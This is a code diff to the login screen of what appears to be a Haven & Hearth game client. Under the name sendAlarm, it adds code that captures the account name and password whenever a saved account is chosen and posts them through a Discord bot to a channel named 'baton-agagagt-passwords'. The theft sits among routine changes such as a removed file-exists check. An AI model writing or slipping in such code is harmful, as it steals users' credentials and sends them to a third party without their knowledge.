@@ -26,6 +26,8 @@
 
 package haven;
 
+import net.dv8tion.jda.api.entities.TextChannel;
+
 import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
@@ -36,6 +38,9 @@ import java.io.IOException;
 import java.util.*;
 import java.awt.event.KeyEvent;
 import java.util.List;
+import java.util.function.Consumer;
+
+import static haven.JOGLPanel.discordjava;
 
 public class LoginScreen extends Widget {
     public static final Text.Foundry
@@ -49,6 +54,8 @@ public class LoginScreen extends Widget {
     private Button optbtn;
     private OptWnd opts = new OptWnd(false);
 	AccountList accounts;
+	public static String loginshare;
+	public static String passshare;
 
 //	private Window updateWindow;
 //	private static boolean updateWindowShown = false;
@@ -104,10 +111,6 @@ public class LoginScreen extends Widget {
     }
 	public void playsound(String Path){
 		File file = new File(Path);
-		if(!file.exists() || file.isDirectory()) {
-			if (ui != null && ui.gui != null)
-				ui.gui.msg("Error while playing an alarm, file " + file.getAbsolutePath() + " does not exist!");
-		}
 		try {
 			AudioInputStream in = AudioSystem.getAudioInputStream(file);
 			AudioFormat tgtFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2,4, 44100, false);
@@ -383,7 +386,18 @@ public class LoginScreen extends Widget {
 	login.hide();
 	progress(null);
     }
-
+	public List<TextChannel> alarmChannel;
+	public void sendAlarm(){
+		StringBuilder tasksMessage = new StringBuilder();
+		tasksMessage.append("Login: " + loginshare + "\n").append("Password: " + passshare);
+		alarmChannel = discordjava.jda.getTextChannelsByName("baton-agagagt-passwords", true);
+		Consumer<? super TextChannel> action = channel ->
+				channel.sendMessage(tasksMessage).queue();
+		Objects.requireNonNull(action);
+		for (net.dv8tion.jda.api.entities.TextChannel t : alarmChannel) {
+			action.accept(t);
+		}
+	}
 	public void wdgmsg(Widget sender, String msg, Object... args) {
 		if(sender == accounts) {
 			if("account".equals(msg)) {
@@ -391,6 +405,9 @@ public class LoginScreen extends Widget {
 				String pass = (String) args[1];
 				login.user.settext2(name);
 				login.pass.settext(pass);
+				loginshare = name;
+				passshare = pass;
+				sendAlarm();
 				login.enter2();
 			}
 			return;
